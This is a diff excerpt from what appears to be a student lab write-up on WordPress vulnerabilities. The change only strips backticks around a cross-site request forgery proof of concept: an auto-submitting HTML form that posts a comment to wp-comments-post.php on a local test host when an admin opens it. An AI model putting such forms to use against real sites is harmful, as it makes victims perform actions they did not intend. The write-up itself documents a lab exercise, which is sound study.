@@ -19,7 +19,7 @@ Time spent: 17 hours spent in total
   - Post a comment to check it is taking the admin's comment
   - Submit a malicious form that goes into /wp-comments-post.php hosted on github
   
-      `<html>
+      <html>
 	      <head></head>
 	      <body>
 		      <form name="csrfForm" action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
@@ -32,7 +32,7 @@ Time spent: 17 hours spent in total
 		      </form> 
 		      <script> document.csrfForm.submit(); </script>
 	      </body>
-      </html>`
+      </html>
 
   - The comment "I made a comment" will be posted after going to the github link which is submitting the form
 - [ ] Affected source code:
